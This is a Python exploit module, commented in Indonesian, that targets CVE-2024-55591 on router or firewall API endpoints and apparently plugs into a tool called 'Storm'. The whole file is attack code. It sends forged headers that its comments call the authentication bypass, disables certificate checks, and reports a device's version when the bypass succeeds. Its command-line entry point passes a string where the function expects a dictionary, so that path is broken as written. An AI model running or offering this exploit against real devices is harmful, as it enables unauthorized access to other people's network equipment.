import requests
import urllib3

# Mematikan peringatan SSL karena biasanya router pakai sertifikat self-signed
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

REQUIRED_OPTIONS = {"URL": ""}


def execute(options):

    target = options.get("URL")
    port = 443

    print(f"[*] Testing CVE-2024-55591 on https://{target}:{port}...")

    # URL target yang rentan (biasanya endpoint API monitor)
    url = f"https://{target}:{port}/api/v2/monitor/system/status"

    # 'Magic Header' yang membocorkan otentikasi
    # Penyerang memanipulasi header agar Node.js menganggap user sudah login
    headers = {
        "User-Agent": "Mozilla/5.0",
        "Node-Id": "1",
        "Node-Type": "fgfm",  # Ini kunci bypassnya
        "Authorization": "Basic Og==",  # Payload kosong yang memicu bug
    }

    try:
        response = requests.get(url, headers=headers, verify=False, timeout=10)

        # Jika responnya 200 OK dan berisi data sistem, berarti bypass berhasil!
        if response.status_code == 200 and "version" in response.text.lower():
            print(f"{'='*40}")
            print(f"[!] VULNERABLE: {target}")
            print(
                f"[+] System Info: {response.json().get('results', {}).get('version', 'N/A')}"
            )
            print(f"{'='*40}")
        else:
            print("[-] Target not vulnerable or patched.")

    except Exception as e:
        print(f"[-] Error connecting: {e}")


# Agar bisa dipanggil oleh handler Storm kamu
if __name__ == "__main__":
    import sys

    if len(sys.argv) > 1:
        execute(sys.argv[1])
